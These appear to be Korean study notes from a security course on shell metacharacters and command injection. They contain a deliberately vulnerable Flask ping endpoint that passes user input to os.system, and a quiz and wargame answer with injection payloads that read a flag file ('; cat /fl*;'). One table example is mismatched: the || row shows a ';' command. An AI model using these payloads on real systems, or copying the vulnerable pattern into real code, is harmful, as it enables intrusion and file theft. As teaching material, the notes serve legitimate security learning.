
# 1. 메타문자

|메타 문자|설명|Example|
|---|---|---|
|` `` `|**명령어 치환  <br>**` `` `안에 들어있는 명령어를 실행한 결과로 치환됩니다.|$ echo `echo theori`theori |
|$()|**명령어 치환** <br>`$()`안에 들어있는 명령어를 실행한 결과로 치환됩니다. 이 문자는 위와 다르게 중복 사용이 가능합니다. (`echo $(echo $(echo theori))`)|$ echo $(echo theori)theori|
|&&| **명령어 연속 실행** <br> 한 줄에 여러 명령어를 사용하고 싶을 때 사용합니다. 앞 명령어에서 에러가 발생하지 않아야 뒷 명령어를 실행합니다. (Logical And) |$ echo hello && echo theorihellotheori| 
|\|\|| **명령어 구분자** <br>한 줄에 여러 명령어를 사용하고 싶을 때 사용합니다. 앞 명령어에서 에러가 발생해야 뒷 명령어를 실행합니다. (Logical Or)| $ echo hello ; echo theorihellotheori |
|;| **명령어 구분자** <br>한 줄에 여러 명령어를 사용하고 싶을 때 사용합니다. `;`은 단순히 명령어를 구분하기 위해 사용하며, 앞 명령어의 에러 유무와 관계 없이 뒷 명령어를 실행합니다.|$ echo hello ; echo theorihellotheori|
|\||**파이프** <br>앞 명령어의 결과가 뒷 명령어의 입력으로 들어갑니다.|$ echo id \| /bin/shuid=1001(theori) gid=1001(theori) groups=1001(theori)|


# 2. Command Injection 실습

**Figure 2**은 Command Injection이 발생하는 예제 코드입니다. 코드를 살펴보면, URL 쿼리를 통해 전달되는 `ip` 값을 ping 명령어의 인자로 전달합니다.

**Figure 2. Command Injection**
```
@app.route('/ping')
def ping(): 
ip = request.args.get('ip') 
return os.system(f'ping -c 3 {ip}')
```

**메타문자(Meta Caracter)**
특수한 의미를 가진 문자. 예를 들어, 셸 프로그램에서 `;`를 사용하면 여러 개의 명령어를 순서대로 실행시킬 수 있음.


# 3. quiz

```
@app.route('/ping')
def ping():
	ip = request.args.get('ip')
	return os.system(f'ping -c 3 "{ip}"')
```


* C `"; cat /fl*; "`

# 4. 워게임 정답 

* `"|| cat flag.py || echo "`
